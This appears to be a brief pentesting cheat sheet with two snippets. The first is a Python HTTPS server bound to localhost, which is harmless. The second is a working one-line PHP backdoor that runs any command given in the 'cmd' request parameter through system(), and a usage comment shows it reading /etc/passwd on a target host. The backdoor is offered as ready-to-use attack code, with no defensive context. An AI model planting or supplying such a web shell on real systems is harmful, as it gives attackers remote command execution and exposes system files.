## Python Server

```
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
from http.server import HTTPServer, SimpleHTTPRequestHandler
import ssl

httpd = HTTPServer(('localhost', 4443), SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile='/tmp/server.pem', server_side=True)
httpd.serve_forever()

```

## Simple PHP Backdoor By DK (One-Liner Version) 

```
<!-- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd -->
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```

